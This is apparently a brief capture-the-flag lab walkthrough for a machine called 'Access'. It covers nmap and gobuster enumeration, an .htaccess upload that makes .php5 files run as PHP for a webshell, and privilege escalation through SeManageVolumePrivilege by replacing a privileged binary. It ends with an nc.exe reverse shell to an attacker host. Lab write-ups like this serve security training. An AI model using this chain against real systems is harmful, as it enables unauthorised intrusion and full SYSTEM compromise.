# Access
> .htaccess upload + SeManageVolume

## Enumeration

```
nmap -sC -sV -oN nmap.txt <IP>
```

```
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

## Exploitation

Upload `.htaccess` file to enable PHP execution:

```
echo 'AddType application/x-httpd-php .php5' > .htaccess
```

Upload `.php5` webshell and execute commands.

## Privilege Escalation

```
whoami /priv
```

`SeManageVolumePrivilege` privilege enabled.

```
SeManageVolume.exe
```

Read/write access to the volume — replace privileged binary.

```
nc.exe <IP> <PORTA> -e cmd.exe
```

SYSTEM obtained.
